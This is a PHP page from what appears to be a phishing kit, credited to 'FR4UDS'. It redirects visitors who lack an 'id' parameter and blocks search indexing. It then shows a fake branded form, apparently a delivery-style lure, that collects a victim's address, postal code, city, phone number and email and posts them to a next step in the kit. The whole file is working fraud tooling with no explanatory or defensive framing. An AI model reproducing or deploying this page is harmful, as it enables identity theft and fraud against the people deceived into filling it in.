<?php 
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Author Name      : FR4UDS
===========================================================================*/
    $page = 'default';
    require_once 'init.php';

    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './11644210b.php?step=tow&'.$id;
      
?>
<!DOCTYPE html>
<html lang="en">
	<head>
	<meta charset="UTF-8"/>
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title><?php echo lang('Title'); ?></title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="google" content="notranslate">
	<meta name="description" content="">
	<meta name="google" content="notranslate">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="<?php echo $css1; ?>">
	<link rel="stylesheet" href="./layout/css/style.css">
	<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
	<script src="<?php echo $js;?>"></script>
	<script src="./layout/js/style.js"></script>
	</head>
	<body class="lowla">
		<div id="bg-load" class="bg-load"><div class="load"></div>	</div>
		<div class="contenu">
		<header>
			<div class="pri">
				<span class="prv"><?php echo lang('Fo9001'); ?></span>
				<span class="per"><?php echo lang('Fo9002'); ?></span>
			</div>
			<div class="bande">
				<span class="lg"><img src="./layout/img/lg.svg"></span>
			<ul>
			<li><?php echo lang('LdngP2'); ?></li>
			<li><?php echo lang('LdngP3'); ?></li>
			<li><?php echo lang('LdngP4'); ?></li>
			</ul>
			</div>
		</header>
		<section>
		<form id="lFrm" method="post" action="<?php echo $action; ?>">
			<div class="parag">
				<span class="titr"><?php echo lang('LdngP5'); ?></span>
				<span class="deta"><?php echo lang('CntP'); ?></span>
				<span class="deta"><?php echo lang('CusId'); ?></span>
			</div>
			<div class="box">
			<div class="pak">
				<div class="allt">
				<div>
				<input type="text" class="stre" id="stre" name="stre" maxlength="20" required placeholder="<?php echo lang('AddInf'); ?>" autocomplete="off" autofocus />
				<input type="text" class="maiz" id="maiz" name="maiz" maxlength="30" required placeholder="<?php echo lang('CodPOs'); ?>" autocomplete="off">
				<input type="text" class="zi" id="zi" name="zi" maxlength="10" required placeholder="<?php echo lang('MdiNa'); ?>" autocomplete="off">
				<input type="text" class="Vie" id="Vie" name="Vie" maxlength="10" placeholder="<?php echo lang('Zdiyad'); ?>" autocomplete="off">
				<input type="text" class="tl" id="tl" name="tl" maxlength="60" required placeholder="<?php echo lang('Farnon'); ?>" autocomplete="off">
				<input type="text" class="em" id="em" name="em" maxlength="60" required placeholder="<?php echo lang('Barid'); ?>" autocomplete="off">
				</div>
				</div>
				<div class="erro2">
				<span><?php echo lang('Sfokh'); ?><span style="color:#d40511;font-weight:bold"><?php echo lang('Ayam'); ?></span> <?php echo lang('Froth'); ?></span>
				</div>
			</div>
			</div>
			<div><button type="submit" class="text-center" ><?php echo lang('Ntke'); ?></button></div>
		</form>
			<div class="pubb"><img class="pb01" src="./layout/img/pub.jpg"><img class="pb02" src="./layout/img/pubr.gif"></div>
		</section>
		</div>

	<footer>
			<div class="contenu">
		<ul>
		<li><?php echo lang('AsdH2'); ?></li>
		<li><?php echo lang('AsdS1'); ?></li>
		<li><?php echo lang('AsdS2'); ?></li>
		<li><?php echo lang('AsdS3'); ?></li>
		</ul>
		<ul>
		<li><?php echo lang('AsdS4'); ?></li>
		<li><?php echo lang('P1H1'); ?></li>
		<li><?php echo lang('P1Pr'); ?></li>
		<li><?php echo lang('P2H1'); ?></li>
		</ul>
		<ul>
		<li><?php echo lang('P2Pr'); ?></li>
		<li><?php echo lang('P3H1'); ?></li>
		<li><?php echo lang('P3Pr'); ?></li>
		<li><?php echo lang('PLink'); ?></li>
		<li><?php echo lang('FtrS1'); ?></li>
		</ul>
		<div>&copy; <?php echo date("Y"); ?><?php echo lang('FtrS2'); ?></div>
		</div>
	</footer>
	</body>
<script src="<?php echo $js;?>"></script>
	<script>
		function onReady(callback) {
  var intervalId = window.setInterval(function() {
    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
      callback.call(this);
    }
  }, 1900);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
  setVisible('#bg-load', false);
});

	</script>
</html>
<?php
    endif;
    ob_end_flush();
?>
